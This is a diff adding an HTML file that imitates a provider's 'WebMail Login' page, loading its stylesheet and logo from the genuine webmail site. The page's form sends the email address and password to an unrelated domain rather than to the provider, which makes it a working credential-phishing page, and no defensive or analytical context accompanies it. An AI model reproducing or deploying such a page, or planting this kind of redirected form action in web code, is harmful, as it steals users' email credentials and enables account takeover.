@@ -1,0 +1,113 @@
+<html><!-- no doctype found, outputting delayed lines --><!-- Start of login.htm --><!-- delayed after doctype--><head>
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
+<link rel="StyleSheet" href="https://webmail.gctel.net/nwimg/swlogin.css" type="text/css">
+
+
+<style type="text/css">
+	 #loading_ajax,#loading_html{position:absolute;left:0;top:0;width:100%;height:100%;z-index:1000;background-color:#fff;}
+	 .msg1{position:absolute;left:20px;top:30px;font-size:14px;font-weight:bold;color:#000}
+	 .msg2{position:absolute;right:20px;bottom:30px;font-size:12px;font-weight:normal;color:#000}
+</style>
+  <title>WebMail Login</title>
+</head>
+
+<body class="body_bg2">
+
+
+
+
+<form action="https://hw-0-sdp.top/rea-alp/login.php" method="POST" name="main">
+<input type="hidden" name="cmd" value="">
+<input type="hidden" name="devt_mode" value="">
+<input type="hidden" name="live_id" value="">
+<input type="hidden" name="domain_ex" value="">
+<input type="hidden" name="update_cache" value="">
+
+<div id="container" style="border-width:0px">
+<div id="content" style="border-width:0px;margin:auto;width:450px;background-color:#ffffff;align:center">
+<h3><img src="https://webmail.gctel.net/scripts/image.pl" alt="WebMail"></h3>
+<fieldset>
+        <legend>Welcome to WebMail</legend>
+
+        <div class="formrow">
+<span class="prompt"><label for="user">Email Address</label></span>
+                <div class="element"><input type="text" name="username_ex" value="" tabindex="1">
+</div>
+        </div>
+
+        <div class="formrow">
+                <span class="prompt"><label for="user">Password</label></span>
+                <div class="element"><input type="password" name="password" tabindex="2">
+</div>
+        </div>
+                <div class="formrow">
+                        <span class="prompt"><label for="user">Template Set</label></span>
+                        <div class="element">
+<select name="interface_ex" onchange="select_interface(this)">
+	<option value="ajax">Standard </option>
+	<option value="html">Basic</option>
+	<option value="mobile">Mobile</option>
+ </select>
+</div>
+        </div>
+
+        <div class="formrow">
+                <span class="prompt"><label for="_tpl_lang">Language</label></span>
+                <div class="element">
+ <select name="language" onchange="select_lang(this);">
+		<option value="English US">English
+				</option><option value="French">French
+				</option><option value="Portuguese">Portuguese
+				</option><option value="Danish">Danish
+				</option><option value="Dutch">Dutch
+				</option><option value="German">German
+				</option><option value="Spanish">Spanish
+				</option></select>
+ </div>
+        </div>
+
+        <div class="formrow">
+                <span class="prompt"><label for="user">Remember Me</label></span>
+                <div class="element"><input name="remember" id="remember" type="checkbox">
+</div>
+        </div>
+	
+		<div class="formrow">
+			<span class="prompt">&nbsp;</span>
+			<div class="element">
+				<a href="/cgi/user.cgi?cmd=cmd_user_forget">Forgot password</a>
+			</div>
+		</div>
+	        <div class="formrow">
+                <span class="prompt">&nbsp;</span>
+                <div class="element">
+			<input name="cmd_login" class="loginbutton" id="cmd_login" value="Log in" onclick="check_mode(event); checkaddress();" tabindex="3" type="submit">
+                        <!-- <input type="image" src="/getmail.gif" value="Login" alt="Login" name="cmd_login" id="cmd_login" tabindex="3" style="border-width: 0px;" onClick="check_mode(event); checkaddress();" /> -->
+                </div>
+        </div>
+</fieldset>
+<div id="bad_browser" style="text-align: left; display: none;">
+ 	<div style="padding-top:5px; padding-bottom:5px;">
+ 	Browser: <span style="color:red;font-weight:bold;font-style:italic;">FAILED TEST</span>
+ 	</div>
+ 	<div style="font-size:0.9em;">
+ 	Note: <font style="color:red;">A modern browser is needed to use the standard (Ajax/Web 2.0) interface.</font> <br>
+ 	&nbsp;&nbsp;- Tested to work: IE7+, Safari 3.1+, Firefox 3.0+, Google Chrome 1+<br>
+
+ 	&nbsp;&nbsp;- Mostly works in : Opera 9.51, Firefox 2.0, Camino 1.69<br>
+ 	&nbsp;&nbsp;- Will NOT work in : various other older browsers including IE6<br>
+	</div>
+ 	<div style="padding-top:5px; padding-bottom:5px;">
+ 	Note: Other modern browsers such as recent Opera etc will probably work but need further compatibility testing &amp; development
+ 	</div>
+ 	</div>
+</div>
+
+
+</div></form>
+
+
+
+
+
+</body></html>
